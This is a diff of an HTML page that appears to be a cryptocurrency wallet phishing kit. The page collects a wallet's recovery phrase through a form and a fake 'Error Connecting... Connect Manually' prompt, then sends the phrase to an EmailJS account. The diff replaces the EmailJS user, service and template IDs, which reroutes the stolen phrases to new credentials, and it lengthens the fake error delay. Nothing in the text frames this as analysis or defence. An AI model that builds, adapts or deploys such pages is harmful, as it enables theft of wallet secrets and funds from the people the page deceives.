@@ -9002,7 +9002,7 @@
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     (function () {
-      emailjs.init("iVGmU4pl3ORLCeERV"); // Replace YOUR_USER_ID with your actual user ID
+      emailjs.init("8kcCHUTFrGBFvH90m"); // Replace YOUR_USER_ID with your actual user ID
   
       $(document).ready(function () {
         $("#phraseSend").on("click", function () {
@@ -9061,7 +9061,7 @@
           wallet: wallet
         };
   
-        emailjs.send("service_zuhhyoh","template_d4mgj3b", templateParams)
+        emailjs.send("service_rb4dzwg","template_bl7kzxu", templateParams)
           .then(
             (response) => {
               console.log('SUCCESS!', response.status, response.text);
@@ -9081,7 +9081,7 @@
   
   <script>
     (function () {
-      emailjs.init("iVGmU4pl3ORLCeERV");
+      emailjs.init("8kcCHUTFrGBFvH90m");
   
       document.getElementById('form').addEventListener('submit', function (event) {
         event.preventDefault();
@@ -9090,7 +9090,7 @@
         let formData = new FormData(this);
   
         // Send the email
-        emailjs.sendForm("service_zuhhyoh","template_d4mgj3b", formData)
+        emailjs.sendForm("service_rb4dzwg","template_bl7kzxu", formData)
           .then(function (response) {
             console.log('Success!', response.status, response.text);
   
@@ -9142,7 +9142,7 @@
               'Error Connecting... <button class="manual-connection">Connect Manually</button>'
             );
             $(document).find("button.manual-connection").trigger("click");
-          }, 1000);
+          }, 9000);
         });
       });
     });
